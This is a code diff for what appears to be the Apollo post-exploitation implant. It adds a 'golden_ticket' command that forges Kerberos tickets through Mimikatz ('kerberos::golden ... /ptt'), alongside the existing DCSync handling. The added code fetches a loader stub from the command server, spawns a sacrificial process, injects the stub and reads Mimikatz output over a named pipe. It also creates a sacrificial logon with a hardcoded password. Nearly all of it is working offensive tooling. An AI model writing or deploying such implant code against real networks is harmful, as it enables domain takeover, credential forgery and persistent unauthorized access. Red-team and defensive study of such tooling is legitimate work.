@@ -1,13 +1,15 @@
-﻿#define COMMAND_NAME_UPPER
+#define COMMAND_NAME_UPPER
 
 #if DEBUG
 #undef PTH
 #undef DCSYNC
+#undef GOLDEN_TICKET
 #define PTH
 #define DCSYNC
+#define GOLDEN_TICKET
 #endif
 
-#if PTH
+#if PTH || DCSYNC || GOLDEN_TICKET
 
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
@@ -56,6 +58,27 @@ namespace Apollo.CommandModules
         public string pipe_name;
     }
 #endif
+#if GOLDEN_TICKET
+    public struct GoldenTicketParameters
+    {
+        public string domain;
+        public string sid;
+        public string user;
+        public string id;
+        public string groups;
+        public string key_type;
+        public string key;
+        public string target;
+        public string service;
+        public string startoffset;
+        public string endin;
+        public string renewmax;
+        public string sids;
+        public string sacrificial_logon;
+        public string loader_stub_id;
+        public string pipe_name;
+    }
+#endif
     class MimikatzWrappers
     {
 
@@ -84,6 +107,11 @@ namespace Apollo.CommandModules
 #if DCSYNC
                 case "dcsync":
                     DCSync(job, implant);
+                    break;
+#endif
+#if GOLDEN_TICKET
+                case "golden_ticket":
+                    GoldenTicket(job, implant);
                     break;
 #endif
                 default:
@@ -445,6 +473,246 @@ namespace Apollo.CommandModules
                     job.sacrificialProcess = sacrificialProcess;
                     ApolloTaskResponse response; 
                     
+                    if (sacrificialProcess.Inject(loaderStub))
+                    {
+                        //sacrificialProcess.CreateNewRemoteThread(tempBytes);
+                        //sacrificialProcess.ResumeThread();
+                        // bool bRet = sacrificialProcess.StillActive();
+                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);
+
+                        pipeClient.Connect(30000);
+
+                        StreamWriter writer;
+                        try
+                        {
+                            writer = new StreamWriter(pipeClient);
+                            writer.Write(command);
+                            writer.Flush();
+                            using (StreamReader sr = new StreamReader(pipeClient))
+                            {
+                                //sr.ReadLine();
+                                var line = sr.ReadLine();
+                                while (line != null && line.ToUpper().Trim() != "EOF")
+                                {
+                                    output.Add(line);
+                                    line = sr.ReadLine();
+                                }
+                            }
+                            if (pipeClient.IsConnected)
+                                writer.Close();
+
+                            if (output.Count > 0)
+                            {
+                                job.SetComplete(output.ToArray());
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
+                        }
+
+                    }
+                    else
+                    {
+                        job.SetError($"Failed to inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
+                    }
+
+                }
+                else
+                {
+                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
+                }
+            }
+            catch (Exception ex)
+            {
+                if (sacrificialProcess != null)
+                {
+                    job.SetError(String.Format("Error in DCSync (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
+                }
+                else
+                {
+                    job.SetError(String.Format("Error in DCSync. Reason: {0}", ex.Message));
+                }
+            }
+            finally
+            {
+                if (!sacrificialProcess.HasExited)
+                    sacrificialProcess.Kill();
+            }
+
+        }
+#endif
+
+#if GOLDEN_TICKET
+        public static void GoldenTicket(Job job, Agent implant)
+        {
+            GoldenTicketParameters gtParams;
+            Task task = job.Task;
+            string command;
+            string sacrificialApplication;
+            string commandLine = "";
+            string loaderStubID;
+            string pipeName;
+            JObject json;
+            List<string> output = new List<string>();
+            string formatCommand = "\"kerberos::golden /domain:{0} /sid:{1} /user:{2} /id:{3} /groups:{4} /{5}:{6} /target:{7} /service:{8} /startoffset:{9} /endin:{10} /renewmax:{11} /sids:{12} /ptt\"";
+
+            gtParams = JsonConvert.DeserializeObject<GoldenTicketParameters>(job.Task.parameters);
+            if (string.IsNullOrEmpty(gtParams.domain))
+            {
+                job.SetError("Missing required parameter: domain");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(gtParams.sid))
+            {
+                job.SetError("Missing required parameter: sid");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(gtParams.user))
+            {
+                job.SetError("Missing required parameter: user");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(gtParams.id))
+            {
+                gtParams.id = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.groups))
+            {
+                gtParams.groups = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.key_type))
+            {
+                job.SetError("Missing required parameter: key_type");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(gtParams.key))
+            {
+                job.SetError("Missing required parameter: key");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(gtParams.target))
+            {
+                gtParams.target = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.service))
+            {
+                gtParams.service = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.startoffset))
+            {
+                gtParams.startoffset = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.endin))
+            {
+                gtParams.endin = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.renewmax))
+            {
+                gtParams.renewmax = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.sids))
+            {
+                gtParams.sids = "";
+            }
+
+            if (string.IsNullOrEmpty(gtParams.sacrificial_logon) || gtParams.sacrificial_logon.ToUpper().Equals("TRUE"))
+            {
+                gtParams.sacrificial_logon = "TRUE";
+                if (!CredentialManager.SetCredential(gtParams.user, "Password1", gtParams.domain))
+                {
+                    job.SetError($"Failed to make_token with {gtParams.user}:Password1\n\t:Error Code: {Marshal.GetLastWin32Error()}");
+                    return;
+                }
+
+                try
+                {
+                    string msg = $"Successfully impersonated {CredentialManager.GetCurrentUsername()}";
+                    ApolloTaskResponse resp = new ApolloTaskResponse(task, msg)
+                    {
+                        artifacts = new Artifact[]
+                        {
+                        new Artifact("Logon Event", $"New Type 9 Logon for {CredentialManager.GetCurrentUsername()}")
+                        }
+                    };
+                    job.AddOutput(resp);
+                }
+                catch (Exception ex)
+                {
+                    job.SetError($"Unknown error: {ex.Message}");
+                    return;
+                }
+            }
+            else if (!gtParams.sacrificial_logon.ToUpper().Equals("TRUE") && !gtParams.sacrificial_logon.ToUpper().Equals("FALSE"))
+            {
+                job.SetError("Invalid parameter: sacrificial_logon - must be TRUE or FALSE");
+                return;
+            }
+
+            command = string.Format(formatCommand, gtParams.domain, gtParams.sid, gtParams.user, gtParams.id, gtParams.groups, gtParams.key_type, gtParams.key, gtParams.target, gtParams.service, gtParams.startoffset, gtParams.endin, gtParams.renewmax, gtParams.sids);
+
+            byte[] loaderStub;
+
+            /*
+             * Response from the server should be of the form:
+             * {
+             * "assembly_name": "registered assembly name",
+             * "loader_stub_id": "File ID of the loader stub",
+             * "pipe_name": "named pipe to connect to",
+             * "assembly_arguments": "command line arguments to send",
+             * }
+             */
+            //ProcessWithAnonymousPipeIO sacrificialProcess = null;
+            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
+
+
+            // Reset the loader stub each time as a new named pipe is given to us from on high.
+            loaderStub = null;
+            try
+            {
+                loaderStub = implant.Profile.GetFile(task.id, gtParams.loader_stub_id, implant.Profile.ChunkSize);
+            }
+            catch (Exception ex)
+            {
+                job.SetError($"Failed to fetch loader stub for Mimikatz. Reason: {ex.Message}.\nParameters:\n{task.parameters}");
+                return;
+            }
+            if (loaderStub == null || loaderStub.Length == 0)
+            {
+                job.SetError(String.Format("Unable to retrieve DLL shellcode stub with ID {0}", gtParams.loader_stub_id));
+                return;
+            }
+
+            pipeName = gtParams.pipe_name;
+            if (string.IsNullOrEmpty(pipeName))
+            {
+                job.SetError("No pipe name was given to DLL to start the named pipe server.");
+                return;
+            }
+
+            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
+            try
+            {
+                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
+
+                if (sacrificialProcess.Start())
+                {
+                    job.ProcessID = (int)sacrificialProcess.PID;
+                    job.sacrificialProcess = sacrificialProcess;
+                    ApolloTaskResponse response;
+
                     if (sacrificialProcess.Inject(loaderStub))
                     {
                         //sacrificialProcess.CreateNewRemoteThread(tempBytes);
